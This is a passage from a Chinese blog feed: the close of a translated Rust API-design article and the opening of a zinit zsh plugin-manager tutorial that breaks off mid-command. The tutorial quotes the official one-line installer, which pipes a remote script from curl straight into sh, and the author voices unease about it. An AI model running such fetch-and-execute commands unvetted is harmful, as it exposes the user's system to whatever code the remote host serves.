<code>Iterator</code> 的 trait</h5><p>有一些库实现了类似 <code>Iterator</code> 的 trait，比如：</p><ul><li><code>futures::Stream</code>：如 <a href="https://github.com/alexcrichton/futures-rs/blob/f78905e584d06e69e5237ca12745ccd3d6f4a73a/TUTORIAL.md#the-stream-trait" target="_blank" rel="noopener"><code>futures</code> 教程</a>所说，类似 <code>Iterator::next</code> 返回 <code>Option&lt;Self::Item&gt;</code>，<code>Stream::poll</code> 返回一个 <code>Option&lt;Self::Item&gt;</code> 的异步结果（或者返回一个错误）。</li></ul><h4 id="接受闭包"><a class="headerlink" href="#接受闭包"></a>接受闭包</h4><p>如果有一个可能比较昂贵的值（暂称为类型 <code>Value</code>），而且它并不会在所有的分支中都被使用到，这时可以考虑使用一个返回这个值的闭包（<code>Fn() -&gt; Value</code>）。</p><p>如果你在设计一个 trait，你也可以为此设计两个功能相同的方法，不同的是一个接受值而另一个接受用于计算出值的闭包。一个实际例子是 <code>Result</code> 中的 <code>unwrap_or</code> 和 <code>unwrap_or_else</code>：</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> res: <span class="built_in">Result</span>&lt;<span class="built_in">i32</span>, &amp;<span class="built_in">str</span>&gt; = <span class="literal">Err</span>(<span class="string">"oh noes"</span>);</span><br><span class="line">res.unwrap_or(<span class="number">42</span>); <span class="comment">// 立即返回 `42`</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> res: <span class="built_in">Result</span>&lt;<span class="built_in">i32</span>, &amp;<span class="built_in">str</span>&gt; = <span class="literal">Err</span>(<span class="string">"oh noes"</span>);</span><br><span class="line">res.unwrap_or_else(|msg| msg.len() <span class="keyword">as</span> <span class="built_in">i32</span>); <span class="comment">// 将会在需要的时候调用闭包计算</span></span><br></pre></td></tr></table></figure><h4 id="关于惰性的小技巧"><a class="headerlink" href="#关于惰性的小技巧"></a>关于惰性的小技巧</h4><ul><li><strong>让 <code>Deref</code> 完成所有的工作</strong>：为你的类型实现 <code>Deref</code>，让它来完成实际的计算逻辑。这个crate <a href="https://crates.io/crates/lazy" target="_blank" rel="noopener"><code>lazy</code></a>实现了一个能为你完成这件事情的宏（不过需要 unstable 特性）。</li></ul><h3 id="提升易用性的-trait"><a class="headerlink" href="#提升易用性的-trait"></a>提升易用性的 trait</h3><p>这里列举了一些你应该试着为你的类型实现的 trait，它们可以让你的类型更加易用：</p><ul><li>实现或者派生（derive）“常用” 的 trait 比如 <code>Debug</code>、<code>Hash</code>、<code>PartialEq</code>、<code>PartialOrd</code>、<code>Eq</code>、<code>Ord</code></li><li>实现或者派生<a href="https://doc.rust-lang.org/std/default/trait.Default.html" target="_blank" rel="noopener"><code>Default</code></a>，而不是编写一个不接受任何参数的 <code>new</code> 方法。</li><li>如果你正在为一个类型实现一个可以将它的数据作为 <code>Iterator</code> 返回的方法，你也应该考虑为这个类型实现<a href="https://doc.rust-lang.org/std/iter/trait.IntoIterator.html" target="_blank" rel="noopener"><code>IntoIterator</code></a>。（仅有<strong>一种</strong>迭代数据的主要方式时，才建议这么做。 另请参见上面有关迭代器的部分。）</li><li>如果你的自定义数据类型和 <code>std</code> 中的基本类型 <code>T</code> 很相似，请考虑为它实现 <a href="https://doc.rust-lang.org/std/ops/trait.Deref.html" target="_blank" rel="noopener"><code>Deref&lt;Target=T&gt;</code></a>，不过<strong>请</strong>不要滥用——<code>Deref</code> 不是用来模拟继承的！</li><li>不要编写一个接受字符串作为参数然后返回一个实例的构造方法，请使用<a href="https://doc.rust-lang.org/std/str/trait.FromStr.html" target="_blank" rel="noopener"><code>FromStr</code></a></li></ul><h3 id="为输入参数实现自定义-trait"><a class="headerlink" href="#为输入参数实现自定义-trait"></a>为输入参数实现自定义 trait</h3><p>Rust 中实现某种 “函数重载” 的方式是为参数指定一个泛型 trait <code>T</code>，然后对参数的可能的所有类型都实现 <code>T</code>。</p><h4 id="例：str-find"><a class="headerlink" href="#例：str-find"></a>例：<a href="https://doc.rust-lang.org/std/primitive.str.html#method.find" target="_blank" rel="noopener"><code>str::find</code></a></h4><p><code>str::find&lt;P: Pattern&gt;(p: P)</code> 接受一个<a href="https://doc.rust-lang.org/std/str/pattern/trait.Pattern.html" target="_blank" rel="noopener"><code>Pattern</code></a>作为输入，<code>char</code>、<code>str</code>、<code>FnMut(char) -&gt; bool</code> 等类型都实现了这个 trait</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"Lorem ipsum"</span>.find(<span class="string">'L'</span>);</span><br><span class="line"><span class="string">"Lorem ipsum"</span>.find(<span class="string">"ipsum"</span>);</span><br><span class="line"><span class="string">"Lorem ipsum"</span>.find(<span class="built_in">char</span>::is_whitespace);</span><br></pre></td></tr></table></figure><h3 id="扩展-trait"><a class="headerlink" href="#扩展-trait"></a>扩展 trait</h3><p>尽量使用标准库中定义的类型和 trait，因为大部分 Rust 程序员都了解它们，它们经过了充分的测试并且有良好的文档。不过，由于 Rust 标准库倾向于提供有语义含义的类型<sup class="footnote-ref"><a href="#fn4" id="fnref4">[4]</a></sup>，这些类型包含的方法可能对你的 API 来说还不够。幸运的是，Rust 的 “孤儿规则（orphan rules）” 赋予了为任何类型实现任何 trait 的能力——前提是类型和 trait 中的任意一个是在当前 crate 中定义的。</p><h4 id="装饰结果"><a class="headerlink" href="#装饰结果"></a>装饰结果</h4><p>如 <a href="https://twitter.com/Argorak" target="_blank" rel="noopener">Florian</a> 在 <a href="http://yakshav.es/decorating-results/" target="_blank" rel="noopener">“Decorating Results”</a> 中写到的，你可以使用这种方法来编写并实现 trait 来为内置类型如 <code>Result</code> 实现自己的方法。举例：</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">pub</span> <span class="class"><span class="keyword">trait</span> <span class="title">GrandResultExt</span></span> &#123;</span><br><span class="line">    <span class="function"><span class="keyword">fn</span> <span class="title">party</span></span>(<span class="keyword">self</span>) -&gt; <span class="keyword">Self</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">impl</span> GrandResultExt <span class="keyword">for</span> <span class="built_in">Result</span>&lt;<span class="built_in">String</span>, <span class="built_in">Box</span>&lt;Error&gt;&gt; &#123;</span><br><span class="line">    <span class="function"><span class="keyword">fn</span> <span class="title">party</span></span>(<span class="keyword">self</span>) -&gt; <span class="built_in">Result</span>&lt;<span class="built_in">String</span>, <span class="built_in">Box</span>&lt;Error&gt;&gt; &#123;</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">self</span>.is_ok() &#123;</span><br><span class="line">          <span class="built_in">println!</span>(<span class="string">"Wooohoo! 🎉"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">self</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 用户代码</span></span><br><span class="line"><span class="function"><span class="keyword">fn</span> <span class="title">main</span></span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> fortune = library_function()</span><br><span class="line">        .method_returning_result()</span><br><span class="line">        .party()</span><br><span class="line">        .unwrap_or(<span class="string">"Out of luck."</span>.to_string());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Florian 在 <a href="https://github.com/skade/lazers/blob/d9ace30c05cf103c5faf0660c06127b578c92762/lazers-traits/src/decorations.md#results-of-finding-a-database" target="_blank" rel="noopener">lazers</a> 的真实代码中使用了这样的模式装饰了 <code>BoxFuture</code>（来自 <code>futures</code> crate）以让代码更加可读：</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> my_database = client</span><br><span class="line">    .find_database(<span class="string">"might_not_exist"</span>)</span><br><span class="line">    .or_create();</span><br></pre></td></tr></table></figure><h4 id="扩展-trait-v2"><a class="headerlink" href="#扩展-trait-v2"></a>扩展 trait</h4><p>到目前为止，我们已经通过定义并实现自己的 trait 扩展了类型上的可用方法。但你还可以定义<strong>扩展其他 trait</strong> 的 trait（<code>trait MyTrait: BufRead + Debug {}</code>）。最突出的例子是 <a href="https://crates.io/crates/itertools" target="_blank" rel="noopener">itertools</a> crate，它为 <code>std</code> 的迭代器添加了一大堆方法。</p><h3 id="建造者模式"><a class="headerlink" href="#建造者模式"></a>建造者模式</h3><p>通过将一堆小方法串联在一起你可以让复杂的 API 更加易于调用。这个和 Session Type 非常搭（稍后会提到）。<a href="https://crates.io/crates/derive_builder" target="_blank" rel="noopener"><code>derive_builder</code></a> crate 可以用来为自定义的 struct 自动生成（简单的）Builder</p><h4 id="例：-std-fs-openoptions"><a class="headerlink" href="#例：-std-fs-openoptions"></a>例： <a href="https://doc.rust-lang.org/std/fs/struct.OpenOptions.html" target="_blank" rel="noopener"><code>std::fs::OpenOptions</code></a></h4><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> std::fs::OpenOptions;</span><br><span class="line"><span class="keyword">let</span> file = OpenOptions::new().read(<span class="literal">true</span>).write(<span class="literal">true</span>).open(<span class="string">"foo.txt"</span>);</span><br></pre></td></tr></table></figure><h3 id="session-type"><a class="headerlink" href="#session-type"></a>Session Type</h3><p>你可以在类型系统中编码一个状态机。</p><ol><li>每个状态都有不同的类型。</li><li>每个状态类型都实现了不同的方法。</li><li>一些方法会消耗这个状态类型（获取所有权）并且返回另一个状态类型。</li></ol><p>这个技巧在 Rust 中工作地非常良好，因为你的方法可以将数据移动到新的类型中，并且保证在之后你就无法访问旧状态了。</p><p>这是一个关于邮寄包裹的小例子：</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> p: OpenPackage = Package::new();</span><br><span class="line"><span class="keyword">let</span> p: OpenPackage = package.insert([stuff, padding, padding]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> p: ClosedPackage = package.seal_up();</span><br><span class="line"></span><br><span class="line"><span class="comment">// let p: OpenPackage = package.insert([more_stuff]);</span></span><br><span class="line"><span class="comment">//~^ ERROR: No method named `insert` on `ClosedPackage`</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> p: DeliveryTracking = package.send(address, postage);</span><br></pre></td></tr></table></figure><p>一个很好的实际例子是 /u/ssokolow <a href="https://www.reddit.com/r/rust/comments/568yvh/typesafe_unions_in_c_and_rust/d8hcwfs" target="_blank" rel="noopener">在 /r/rust 的这个帖子</a> 中给出的：</p><blockquote><p>Hyper 使用这个方法来在编译时保证，你不可能做出诸如 “在请求/响应主体已经开始后又来设置 HTTP 头” 这种经常在 PHP 网站上看到的事。（编译器可以捕获这个错误，因为在该状态下的连接上没有 “set header” 方法，并且由于过时引用会失效，所以被引用的一定是正确的状态。）</p></blockquote><p><a href="http://hyper.rs/hyper/v0.9.10/hyper/server/index.html#an-aside-write-status" target="_blank" rel="noopener"><code>hyper::server</code> 文档</a>中更详细地解释了这是如何实现的。另一个有趣的想法<a href="https://github.com/skade/lazers/blob/96efff493be9312ffc70eac5a04b441952e089eb/lazers-replicator/src/lib.md#verify-peers" target="_blank" rel="noopener">可以在 lazers-replicator crate 中找到</a>：它使用 <code>std::convert::From</code>来在状态中转换。</p><p>更多信息：</p><ul><li>文章 <a href="https://insanitybit.github.io/2016/05/30/beyond-memory-safety-with-types" target="_blank" rel="noopener">“Beyond Memory Safety With Types”</a> 描述了这项技术如何被用来实现一个漂亮并且类型安全的 IMAP 协议。</li><li>论文 <a href="http://munksgaard.me/laumann-munksgaard-larsen.pdf" target="_blank" rel="noopener">“Session types for Rust” (PDF)</a>，作者 Thomas Bracht Laumann Jespersen, Philip Munksgaard, and Ken Friis Larsen (2015). <a href="https://dx.doi.org/10.1145/2808098.2808100" target="_blank" rel="noopener">DOI</a></li><li>Andrew Hobden 的帖子 <a href="https://hoverbear.org/2016/10/12/rust-state-machine-pattern/" target="_blank" rel="noopener">“Pretty State Machine Patterns in Rust”</a> 展示了一些在 Rust 的类型系统中实现状态机的方法。</li></ul><h3 id="使用生命周期"><a class="headerlink" href="#使用生命周期"></a>使用生命周期</h3><p>在静态类型语言中，为你的 API 指定类型和 trait 约束是必不可少的，如前文所说的，它们可以帮助防止逻辑错误。此外，Rust 的类型系统还提供了另一个维度：你还可以描述你的数据的生命周期（并编写生命周期约束）。</p><p>这可以让你（作为开发者）更轻松地对待借用的数据（而不是使用开销更大的拥有所有权的数据）。尽可能地使用引用在 Rust 中是一个良好实践，因为高性能和 “零分配” 的库也是语言的卖点之一。</p><p>不过，你应该尽可能为此编写良好的文档，因为理解生命周期和处理引用对于你的库用户来说可能是个挑战，尤其是对于 Rust 新手来说。</p><p>由于某些原因（可能是比较简短），很多生命周期都被命名为 <code>'a</code>、<code>'b</code>或类似的无意义字符，不过如果你了解引用的生命周期对应的资源的话，你可以找到更好的名称。举例来说，如果你将文件读入到内存并且处理对这块内存的引用，可以将它的生命周期命名为 <code>'file</code>，或者如果你在处理一个 TCP 请求并且解析它的数据，则可以将生命周期命名为 <code>'req</code>。</p><h4 id="将析构代码放在-drop-中"><a class="headerlink" href="#将析构代码放在-drop-中"></a>将析构代码放在 <code>drop</code> 中</h4><p>Rust 的所有权规则不仅能用于内存：如果你的数据类型表示着外部资源（比如 TCP 连接），则在超出作用域时，你可以使用 <code>Drop</code> trait 关闭、释放或清理该资源。你可以像在其他语言中使用析构函数（或者 <code>try ... catch ... finally</code>）一样使用它。</p><p>实际的例子有：</p><ul><li>引用计数类型 <code>Rc</code> 和 <code>Arc</code> 使用 <code>Drop</code> 来减少引用计数（并且在计数归零的时候释放拥有的数据）。</li><li><code>MutexGuard</code> 使用 <code>Drop</code> 来释放它对 <code>Mutex</code> 的锁。</li><li>diesel crate 用 <code>Drop</code> 来关闭数据库连接（比如 <a href="https://github.com/diesel-rs/diesel/blob/9ea449c480739253766bd097e7b06d038fe16590/diesel/src/sqlite/connection/raw.rs#L73" target="_blank" rel="noopener">SQLite</a>）。</li></ul><h2 id="案例学习"><a class="headerlink" href="#案例学习"></a>案例学习</h2><p>在 API 设计中使用了一些不错的技巧的 Rust 库：</p><ul><li><a href="https://crates.io/crates/hyper" target="_blank" rel="noopener">hyper</a>：Session Type（见上文）</li><li><a href="https://crates.io/crates/diesel" target="_blank" rel="noopener">diesel</a>：使用拥有复杂的关联类型的 trait 将 SQL 查询编码为类型</li><li><a href="https://crates.io/crates/futures" target="_blank" rel="noopener">futures</a>：高度抽象并且拥有良好文档的 crate</li></ul><h2 id="其他设计模式"><a class="headerlink" href="#其他设计模式"></a>其他设计模式</h2><p>我在这里介绍的是编写接口的设计模式，即面向用户的 API。虽然我认为其中的一些模式只适用于编写库，但许多模式也同样适用于编写通用应用程序的代码。</p><p>你可以在 <a href="https://github.com/rust-unofficial/patterns" target="_blank" rel="noopener">Rust Design Patterns</a> 仓库中找到更多信息</p><p><strong>Update 2017-04-27</strong>：这篇文章发布以来，Rust 库团队的 <a href="https://github.com/brson" target="_blank" rel="noopener">@brson</a> 已经发布了一个相当全面的 <a href="https://github.com/brson/rust-api-guidelines" target="_blank" rel="noopener">Rust API Guidelines</a> 文档，囊括了我的所有建议，并且内容更全面。</p><hr class="footnotes-sep"><section class="footnotes"><ol class="footnotes-list"><li id="fn1"  class="footnote-item"><p>如果你的类型不需要任何参数就能构造，你应该为它实现 <code>Default</code>，并且使用这个代替 <code>new</code>。一个例外是 “容器” 类型诸如 <code>Vec</code> 或 <code>HashMap</code>，用它们的 <code>new</code> 初始化一个空容器是有意义的。 <a href="#fnref1" class="footnote-backref">↩</a></p></li><li id="fn2"  class="footnote-item"><p>在其他强类型语言中有一句口号 “making illegal states unrepresentable”。我第一次听说这个是在人们谈论 Haskell 的时候，这也是 <em>F# for fun and profit</em> 的<a href="http://fsharpforfunandprofit.com/posts/designing-with-types-making-illegal-states-unrepresentable/" target="_blank" rel="noopener">这篇文章</a>的标题，和 Richard Feldman 在 elm-conf 2016 上的<a href="https://www.youtube.com/watch?v=IcgmSRJHu_8" target="_blank" rel="noopener">这篇演讲</a>。 <a href="#fnref2" class="footnote-backref">↩</a></p></li><li id="fn3"  class="footnote-item"><p>在这方面，Rust 的迭代器与 Java 中的迭代器借口或 Python 中的迭代器协议（等等）非常类似。 <a href="#fnref3" class="footnote-backref">↩</a></p></li><li id="fn4"  class="footnote-item"><p>举例来说，<code>std</code> 使用 <code>Result</code> 类型（包含了 <code>Ok</code> 和 <code>Err</code> 成员）来处理错误，而不是没有这种语义的 <code>Either</code> 类型（包含 <code>Left</code> 和 <code>Right</code> 成员）。 <a href="#fnref4" class="footnote-backref">↩</a></p></li></ol></section>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;一篇讲述 Rust API 设计原则的经典老文，虽然老但仍然值得阅读。前几天有事情把它从旮旯里翻出来了，虽然是经典老文但我估计很多人都没有读过，最近闲着没事干脆用我的辣鸡英语水平翻译一下，也算为 Rust 中文社区做一点贡献。&lt;/p&gt;
&lt;p&gt;原文见：&lt;a href=&quot;https://deterministic.space/elegant-apis-in-rust.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://deterministic.space/elegant-apis-in-rust.html&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="译文" scheme="https://www.aloxaf.com/categories/%E8%AF%91%E6%96%87/"/>
    
    
      <category term="rust" scheme="https://www.aloxaf.com/tags/rust/"/>
    
      <category term="译文" scheme="https://www.aloxaf.com/tags/%E8%AF%91%E6%96%87/"/>
    
      <category term="设计" scheme="https://www.aloxaf.com/tags/%E8%AE%BE%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>加速你的 zsh —— 最强 zsh 插件管理器 zplugin/zinit 教程</title>
    <link href="https://www.aloxaf.com/2019/11/zplugin_tutorial/"/>
    <id>https://www.aloxaf.com/2019/11/zplugin_tutorial/</id>
    <published>2019-11-10T05:43:26.000Z</published>
    <updated>2020-01-26T10:50:36.000Z</updated>
    
    <content type="html"><![CDATA[<p><strong>2020-01-26 更新：</strong></p><p>Zplugin 已改名 Zinit，不过教程中的内容仍然适用。<br>阅读时请自行在脑中替换 （</p><p><strong>2020-01-14 更新：</strong></p><p>博主已经叛逃 powerlevel10k 了（注意是 10k 不是 9k）。<br>p10k 的 Instant Prompt 功能非常好用，它可以在其他插件的加载过程中提供一个精简的 prompt 供使用，相当于后台加载。</p><p>这个功能并不能加快实际的加载速度， 比如 <code>time zsh -ic 'exit'</code> 的结果仍然不会变，但是使用体验提升巨大（体验上几乎是瞬间加载）！</p><p>读到这里的读者建议先尝试一下 p10k（<s>如果很满意就不用往下看了</s>）。</p><p>我已经去掉了配置文件中所有的 zinit 延迟加载语句，不过 zinit 即使去掉延迟加载功能仍然十分强大，我还是选择继续使用 zinit。<br>而且如果加载了特别耗时的插件的话，zinit 仍然是有用的。</p><h1 id="前言"><a class="headerlink" href="#前言"></a>前言</h1><p><a href="https://github.com/zdharma/zinit" target="_blank" rel="noopener">Zinit</a> 是个冷门但是却强大无比的 zsh 插件管理器，它拥有一个 killer feature —— Turbo mode，可以让插件在后台加载。这意味这你可以先加载最重要的插件，比如语法高亮和自动建议，剩下的可以统统放到后台加载，让你的 zsh 尽快进入可用状态。</p><p>利用这个机制，zinit 可以将 zsh 的启动时间缩短到几十毫秒——以我的配置为例，只需要 35 毫秒左右。而使用传统的插件管理器比如 antigen，需要近 200 毫秒才能加载完成。</p><p>这里有一张图，对比了不同插件管理器的速度（来源：<a href="https://gist.github.com/laggardkernel/4a4c4986ccdcaf47b91e8227f9868ded" target="_blank" rel="noopener">Comparison of ZSH frameworks and plugin managers</a>）</p><p><img src="https://raw.githubusercontent.com/vintersnow/zsh_plugin_manager_speed/master/result.png" alt=""></p><p>可以看到 zinit 在插件数目变多时速度……似乎更快了？？？<br>什么鬼，这个大概是实验误差吧，也有可能是第一次启动时编译了自身所以后面变快了。不过 zinit 的速度是毋庸置疑的，哪怕这个插件需要数十秒来加载，只要放在后台加载，一样不影响你的 zsh 启动。</p><p>然而！！这个工具虽然强大，却没多少名气，让人倍感惋惜。</p><p>所以写下这篇文章，希望能有更多人了解到这个工具。<br>不过本文只涉及了它强大功能的冰山一角，深入研究推荐阅读 <a href="https://zdharma.org/zinit/wiki/INTRODUCTION/" target="_blank" rel="noopener">Zinit Wiki</a> 和 Zinit 的 <a href="https://github.com/zdharma/zinit/blob/master/README.md" target="_blank" rel="noopener">README</a>。</p><p>（虽然说是冰山一角，本文的内容也足以覆盖绝大多数情况了）</p><p>（如果你很懒不想研究的话，文末还有一份完整的示例配置，安装完成后可以直接使用）</p><a id="more"></a><h1 id="安装"><a class="headerlink" href="#安装"></a>安装</h1><h2 id="自动安装"><a class="headerlink" href="#自动安装"></a>自动安装</h2><p>官方推荐的安装方式，一键完成。不过让我很没有安全感，我倾向于手动安装。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sh -c <span class="string">"<span class="variable">$(curl -fsSL https://raw.githubusercontent.com/zdharma/zinit/master/doc/install.sh)</span>"</span></span><br></pre></td></tr></table></figure><h2 id="手动安装"><a class="headerlink" href="#手动安装"></a>手动安装</h2><p>首先 clone repo 到随便哪个位置</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/zdharma/zinit.git ~/.zinit/bin</span><br></pre></td></tr></table></figure><p>然后在你的 ~/.zshrc 顶端添加如下语句</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">source</span> ~/.zinit/bin/zinit.zsh</span><br></pre></td></tr></table></figure><p>安装完成，非常简单。</p><h1 id="配置"><a class="headerlink" href="#配置"></a>配置</h1><blockquote><p>我本打算从头写一篇教程，但是感觉自己要么讲得太多了，要么又讲得太少了。干脆直接翻译一下文档的 Introduction 部分吧（</p></blockquote><p>在本篇文档中，你将学会如何：</p><ul><li>在 Zplugin 中使用 Oh My Zsh 和 Prezto 框架</li><li>管理补全</li><li>使用 Turbo mode</li><li>使用 ice 修饰词比如 <code>as&quot;program&quot;</code></li></ul><p>等等</p><h2 id="基本插件加载"><a class="headerlink" href="#基本插件加载"></a>基本插件加载</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">zinit load zdharma/<span class="built_in">history</span>-search-multi-word</span><br><span class="line">zinit light zsh-users/zsh-syntax-highlighting</span><br></pre></td></tr></table></figure><p>以上命令展示了两种最基本的加载插件的方式。</p><ul><li><code>load</code> 会启用分析功能——你可以通过 <code>zinit report {plugin-spec}</code> 跟踪插件具体做了什么，也可以使用 <code>zinit unload {plugin-spec}</code> 卸载插件。</li><li><code>light</code>不会跟踪加载过程，可以提升加载速度，但是会导致失去查看插件报告和动态卸载插件的能力。</li></ul><blockquote><p>开启 Turbo mode 后跟踪插件所耗费的时间可以忽略不计</p></blockquote><h2 id="使用-oh-my-zsh-prezto"><a class="headerlink" href="#使用-oh-my-zsh-prezto"></a>使用 Oh My Zsh &amp; Prezto</h2><p>为了加载 Oh My Zsh 和 Prezto 插件，可以使用 <code>snippet</code> 功能加载代码片段。代码片段是指通过 <code>curl</code>、<code>wget</code> 等工具下载的单个文件。后面直接跟 URL 即可（会自动判断下载工具）。举例：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">zinit snippet <span class="string">'https://github.com/robbyrussell/oh-my-zsh/raw/master/plugins/git/git.plugin.zsh'</span></span><br><span class="line">zinit snippet <span class="string">'https://github.com/sorin-ionescu/prezto/blob/master/modules/helper/init.zsh'</span></span><br></pre></td></tr></table></figure><p>此外，对于 Oh My Zsh 和 Prezto，你还可以使用缩写 <code>OMZ::</code> 和 <code>PZT::</code>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">zinit snippet OMZ::plugins/git/git.plugin.zsh</span><br><span class="line">zinit snippet PZT::modules/helper/init.zsh</span><br></pre></td></tr></table></figure><p>此外的此外，snippet 还支持 Subversion 协议，which GitHub 也支持。这可以让你加载包含多个文件的代码片段（比如 Prezto module 就有可能包含两个或者更多的文件，像 <code>init.zsh</code> 和 <code>alias.zsh</code>）。默认会被 source 的文件有：<code>*.plugin.zsh</code>, <code>init.zsh</code>, <code>*.zsh-theme</code>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># URL 指向目录</span></span><br><span class="line">zinit ice svn</span><br><span class="line">zinit snippet PZT::modules/docker</span><br></pre></td></tr></table></figure><h2 id="代码片段和性能"><a class="headerlink" href="#代码片段和性能"></a>代码片段和性能</h2><p>通过 <code>curl</code>，<code>wget</code> 等工具和 SVN ，你可以几乎完全避免加载 Oh My Zsh 和 Prezto 或者是其他框架的代码。这可以提高 <code>Zplugin</code> 的性能，而且更快更紧凑（指占用内存更小并且加载时间更短）。</p><h2 id="一些-ice-修饰词"><a class="headerlink" href="#一些-ice-修饰词"></a>一些 Ice 修饰词</h2><p>命令 <code>zinit ice</code> 为下一条命令提供了 Ice 修饰词（详见 README <a href="https://github.com/zdharma/zinit#ice-modifiers" target="_blank" rel="noopener">ice-modifiers</a> 一节）。啥意思呢：“ice” 是指一些被添加物（就像被添加到饮料或者咖啡里面的冰块）——在 Zplugin 中这意味着 ice 是被添加到下一条命令中的修饰词，冰块会融化（所以不会持续起作用）——在 Zplugin 中这意味着修饰词只对下一条命令起效。举例来说使用 <code>pick</code> ice 可以显示地选择被执行的文件：（译注：绕半天，其实就是一种实现可选参数的方法）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">zinit ice svn pick<span class="string">"init.zsh"</span></span><br><span class="line">zinit snippet PZT::modules/git</span><br></pre></td></tr></table></figure><p>ice 修饰词的内容可以简单地放在 <code>&quot;...&quot;</code>, <code>'...'</code> 或 <code>$'...'</code> 中。不需要在 ice 修饰词名称的后面加上 <code>&quot;:&quot;</code> （尽管你这么做也没问题，而且加 <code>=</code> 也是可以的。比如 <code>pick=&quot;init.zsh&quot;</code> 或 <code>pick=init.zsh</code> 都是可行的）。<br>这样可以让 <code>vim</code>，<code>emacs</code> 之类的编辑器和 <code>zsh-users/zsh-syntax-highlighting</code> 或 <code>zdharma/fast-syntax-highlighting</code> 能够高亮 ice 修饰词的内容。</p><h2 id="as-program"><a class="headerlink" href="#as-program"></a>as&quot;program&quot;</h2><p>插件并不一定是需要被 source 的脚本，也可以是需要添加到 <code>$PATH</code> 中的命令。为了实现这种效果，需要以 <code>program</code> 为参数调用 <code>as</code> ice （或者以 <code>command</code> 为参数也可以）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">zinit ice as<span class="string">"program"</span> cp<span class="string">"httpstat.sh -&gt; httpstat"</span> pick<span class="string">"httpstat"</span></span><br><span class="line">zinit light b4b4r07/httpstat</span><br></pre></td></tr></table></figure><p>上面的代码会将插件目录添加到 <code>$PATH</code> 中，并复制文件 <code>httpstat.sh</code> 为 <code>httpstat</code> ，并为 <code>pick</code> 选中的文件（本例中为 <code>httpstat</code>） 添加正确的可执行权限（<code>+x</code>）。还有一个修饰词 <code>mv</code>，它和 <code>cp</code> 的工作方式类似，只不过是移动文件而不是复制。<code>mv</code>的优先级比<code>cp</code>低。</p><blockquote><p><code>cp</code> 和 <code>mv</code> ice （还有其它的比如 <code>atclone</code>）只会在插件（或代码片段）被安装的时候运行。要想再次运行它们的话需要先使用 <code>zinit delete PZT::modules/osx</code> 这类命令来删除插件）</p></blockquote><h2 id="atpull"><a class="headerlink" href="#atpull"></a>atpull&quot;...&quot;</h2><p>复制文件相比移动来说是个更佳选择，它便于进行后续更新——因为 repo 中的原始文件并不会被修改，所以 <code>git</code> 不会报告冲突。不过，要想使用 <code>mv</code> 也是可以的，只要你正确使用了 <code>atpull</code> （一个在插件更新（update）的时候被调用的 ice）：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">zinit ice as<span class="string">"program"</span> mv<span class="string">"httpstat.sh -&gt; httpstat"</span> \</span><br><span class="line">      pick<span class="string">"httpstat"</span> atpull<span class="string">'!git reset --hard'</span></span><br><span class="line">zinit light 